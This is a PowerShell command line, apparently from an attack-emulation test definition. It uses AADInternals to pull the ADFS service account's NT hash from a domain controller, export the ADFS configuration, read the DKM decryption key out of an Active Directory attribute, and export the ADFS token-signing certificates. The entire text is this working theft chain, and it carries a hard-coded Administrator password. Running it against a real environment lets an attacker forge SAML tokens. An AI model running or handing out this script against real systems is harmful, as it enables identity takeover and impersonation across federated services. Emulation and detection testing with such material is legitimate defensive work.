    command_line: Import-Module ActiveDirectory -Force Import-Module AADInternals -Force | Out-Null $dcServerName = (Get-ADDomainController).HostName $svc = Get-ADObject -filter * -Properties objectguid,objectsid
      | Where-Object name -eq "adfs_svc" $PWord = ConvertTo-SecureString -String "ReallyStrongPassword" -AsPlainText -Force $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
      Administrator, $PWord $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex $ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID
      $svc.Objectsid.Value -Server sts.contoso.com $Configuration = [xml]$ADFSConfig $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName
      $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn $base = "LDAP://CN=$group,$container,$parent" $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))
      $ADSearch.Filter = '(name=CryptoPolicy)' $ADSearch.PropertiesToLoad.Clear() $ADSearch.PropertiesToLoad.Add("displayName") | Out-Null $aduser = $ADSearch.FindOne() $keyObjectGuid = $ADUser.Properties["displayName"]
      $ADSearch.PropertiesToLoad.Clear() $ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null $ADSearch.Filter="(l=$keyObjectGuid)" $aduser=$ADSearch.FindOne() $key=[byte[]]$aduser.Properties["thumbnailphoto"][0]
      Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key Get-ChildItem | Where-Object {$_ -like "ADFS*"} Write-Host "`nCertificates retrieved successfully"
